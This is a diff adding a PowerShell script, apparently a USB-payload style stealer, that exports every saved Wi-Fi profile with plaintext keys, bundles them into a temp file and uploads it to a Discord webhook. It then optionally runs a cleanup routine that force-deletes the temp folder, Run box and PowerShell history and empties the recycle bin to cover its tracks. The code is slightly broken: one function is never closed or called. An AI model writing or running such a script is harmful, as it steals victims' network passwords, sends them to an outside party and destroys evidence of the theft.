@@ -1,0 +1,74 @@
+############################################################################################################################################################
+
+New-Item -ItemType Directory -Path (Join-Path $env:TEMP -ChildPath "settings") | Out-Null ; netsh wlan export profile folder=C:\Users\$env:USERNAME\AppData\Local\Temp\settings key=clear
+
+############################################################################################################################################################
+
+function XML-to-TXT {
+  # Specify the path to the folder containing XML files
+$xmlFolderPath = "C:\Users\$env:USERNAME\AppData\Local\Temp\settings"
+
+# Specify the path to the output text file
+$outputFilePath = "$env:TEMP\3vr1wh1.txt"
+
+# Get all XML files in the folder
+$xmlFiles = Get-ChildItem -Path $xmlFolderPath -Filter *.xml
+
+# Loop through each XML file and append its content to the output text file
+foreach ($xmlFile in $xmlFiles) {
+    $xmlContent = Get-Content -Path $xmlFile.FullName
+    Add-Content -Path $outputFilePath -Value $xmlContent
+}
+############################################################################################################################################################  
+
+function Upload-Discord {
+
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
+
+$hookurl = $dc
+
+$Body = @{
+  'username' = $env:username
+  'content' = $text
+}
+
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
+
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/3vr1wh1.txt"}
+
+
+
+############################################################################################################################################################
+
+function Clean-Exfil { 
+
+# empty temp folder
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# delete run box history
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
+
+# Delete powershell history
+Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+
+# Empty recycle bin
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+}
+
+############################################################################################################################################################
+
+if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
+
+
+RI $env:TEMP/3vr1wh1.txt
